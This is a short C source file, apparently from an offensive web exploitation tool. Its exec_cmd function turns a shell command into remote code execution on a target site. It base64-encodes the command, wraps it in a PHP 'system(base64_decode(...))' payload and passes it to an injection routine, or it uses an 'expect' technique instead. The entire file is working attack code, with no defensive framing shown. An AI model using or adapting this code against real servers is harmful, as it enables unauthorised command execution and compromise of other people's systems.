#include "fun/exec-cmd.h"
#include "fun/exec-php-code.h"
#include "techniques/rce.h"
#include "memory/alloc.h"
#include "string/base64.h"

#include <stdio.h>
#include <string.h>

char *exec_cmd(const char *url, const char *parameter, const char *code, int technique)
{
	if (technique == expect_tech)
		return expect_rce(url, parameter, code);

	char *finalcode;
	char *b64cmd = b64encode(code, strlen(code));

	xmalloc(finalcode, strlen(b64cmd) + 36);
	sprintf(finalcode, "<?php system(base64_decode(\"%s\")); ?>", b64cmd);

	char *rce = exec_php_code(url, parameter, finalcode, technique);

	free(b64cmd);
	free(finalcode);

	return rce;
}
